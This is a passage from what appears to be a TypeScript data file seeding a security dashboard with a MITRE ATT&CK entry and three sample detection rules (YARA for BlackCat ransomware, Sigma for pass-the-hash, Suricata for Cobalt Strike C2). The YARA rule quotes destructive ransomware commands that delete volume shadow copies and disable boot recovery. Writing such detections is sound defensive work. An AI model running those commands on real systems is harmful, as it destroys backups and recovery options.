  { id: 'T1486', tactic: 'Impact', name: 'Data Encrypted for Impact', description: 'Ransomware encrypting local drives and deleting volume shadow copies.', activeDetections: 6, incidentCount: 2, riskScore: 100 }
];

export const INITIAL_DETECTION_RULES: DetectionRule[] = [
  {
    id: 'rule-01',
    name: 'SentinelX_BlackCat_ALPHV_Ransomware',
    format: 'YARA',
    severity: 'CRITICAL',
    mitreTechnique: 'T1486 / T1055.001',
    author: 'SentinelX AI Detection Lab',
    createdAt: '2026-08-16',
    testedMatchCount: 14,
    description: 'Detects in-memory markers and volume shadow deletion strings used by modern BlackCat/ALPHV ransomware builds.',
    ruleContent: `rule SentinelX_BlackCat_ALPHV_Ransomware {
    meta:
        description = "High-confidence detection for BlackCat ransomware payloads"
        author = "SentinelX DFIR Engine"
        reference = "INC-9041"
        severity = "CRITICAL"
    strings:
        $s1 = "vssadmin.exe Delete Shadows /All /Quiet" ascii wide nocase
        $s2 = "bcdedit /set {default} recoveryenabled No" ascii wide nocase
        $s3 = ".alphv_encrypted" ascii
        $hex_pattern = { 48 83 EC 28 48 89 5C 24 20 48 89 74 24 28 }
    condition:
        uint16(0) == 0x5A4D and (2 of ($s*) or $hex_pattern)
}`
  },
  {
    id: 'rule-02',
    name: 'Sigma_Suspicious_PassTheHash_NTLM',
    format: 'SIGMA',
    severity: 'HIGH',
    mitreTechnique: 'T1550.002',
    author: 'SentinelX Security Ops',
    createdAt: '2026-08-16',
    testedMatchCount: 9,
    description: 'Detects unusual NTLM authentication without prior Kerberos TGT request indicating Pass-the-Hash exploitation.',
    ruleContent: `title: Pass-the-Hash Anomalous NTLM Authentication
id: 5b4c3d2e-1a0f-4e9b-8c7d-6a5b4c3d2e1f
status: production
description: Detects logon event 4624 with NTLM package from non-standard internal endpoints targeting Domain Controllers
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 3
        AuthenticationPackageName: 'NTLM'
        WorkstationName|startswith: 'WS-'
        TargetUserName|contains: 'svc_'
    condition: selection
level: high`
  },
  {
    id: 'rule-03',
    name: 'Suricata_CobaltStrike_Malleable_Beacon',
    format: 'SURICATA',
    severity: 'HIGH',
    mitreTechnique: 'T1071.001',
    author: 'SentinelX Threat Intelligence',
    createdAt: '2026-08-16',
    testedMatchCount: 38,
    description: 'Network IDS rule identifying Cobalt Strike Malleable C2 HTTP traffic mimicking standard jQuery CDN downloads.',
    ruleContent: `alert tcp $HOME_NET any -> $EXTERNAL_NET [80,443,8080,8443] (msg:"SENTINELX MALWARE Cobalt Strike Malleable C2 HTTP Profile JQuery Match"; flow:established,to_server; content:"GET"; http_method; content:"/jquery-3.3.1.min.js"; http_uri; pcre:"/Cookie\\:\\s+[a-zA-Z0-9+\\/]{40,}={0,2}/"; classtype:trojan-activity; sid:9002104; rev:2;)`
  }
];
